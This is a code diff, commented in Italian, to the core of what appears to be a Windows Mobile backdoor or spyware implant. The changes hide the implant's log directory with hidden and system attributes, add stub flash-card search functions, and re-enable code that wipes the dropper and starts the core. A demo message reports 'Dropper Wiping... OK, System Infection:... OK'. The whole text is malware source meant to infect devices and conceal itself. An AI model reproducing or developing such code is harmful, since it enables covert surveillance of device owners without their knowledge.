@@ -16,6 +16,23 @@
 
 
 
+HANDLE __FindFirstFlashCard(LPWIN32_FIND_DATA lpFindFlashData)
+{/// da completare BYGIO
+	HANDLE h=0;
+	return h;
+}
+
+
+
+BOOL __FindNextFlashCard(HANDLE hFlashCard, LPWIN32_FIND_DATA lpFindFlashData)
+{
+	/// da completare BYGIO
+	return TRUE;
+}
+
+
+
+
 
 Core::Core() {
 	OutputDebugString(L"Core");
@@ -38,15 +55,16 @@ BOOL Core::Run() {
 	GetMyName(g_strOurName);
 
 	// Nascondiamo la directory dove c'e' il file di configurazione
-	backdoorPath = L"\\windows";
+	/////backdoorPath = L"\\windows";
+	backdoorPath = L".\\";
 	backdoorPath += LOG_DIR;
 	SetFileAttributes(backdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-/***
+
 	// Rimuoviamo il dropper dalle tre locazioni note, non abbiamo modo di
 	// sapere dove si trovi davvero.
 	ZeroMemory(&wfd, sizeof(wfd));
-	hMmc = FindFirstFlashCard(&wfd);
-
+	hMmc = __FindFirstFlashCard(&wfd);
+/***
 	do {
 		UINT i = 0;
 
@@ -79,8 +97,8 @@ BOOL Core::Run() {
 			DBG_TRACE(L"Debug - Core.cpp - Run() cannot remove \\2577\\ ", 5, TRUE);
 		}
 #endif
-	} while (FindNextFlashCard(hMmc, &wfd));
-
+	} while (__FindNextFlashCard(hMmc, &wfd));
+***/
 	FindClose(hMmc);
 	
 	DeleteFile(L"\\Autorun.exe"); // Il dropper se runnato a mano dalla root, non si rinomina in autorun3.exe
@@ -89,10 +107,10 @@ BOOL Core::Run() {
 
 	ADDDEMOMESSAGE(L"Core Version: 2011112801\nDropper Wiping... OK\nSystem Infection:... OK\n");
 	DBG_TRACE_VERSION;
-***/
+
 	// Rimuoviamo il vecchio core se presente
 	RemoveOldCore();
-	/*****
+	
 	taskObj->StartNotification();
 
 	// Avviamo il core
@@ -114,7 +132,7 @@ BOOL Core::Run() {
 			return FALSE;
 		}
 	}
-	*****/
+	
 	return TRUE;
 }
 
